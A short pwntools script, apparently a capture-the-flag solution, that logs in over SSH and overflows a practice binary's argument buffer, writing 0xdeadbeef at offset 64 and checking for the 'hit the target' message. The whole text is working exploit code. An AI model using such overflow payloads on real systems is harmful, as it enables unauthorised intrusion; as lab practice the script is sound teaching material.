from pwn import *

s = ssh(host=args.HOST, user=args.USER, password=args.PASS, port=int(args.PORT))

payload = fit({64: 0xdeadbeef})
p = s.system([args.BIN, payload])

ret = p.recvline()
assert ret == 'you have hit the target correctly :)\n'
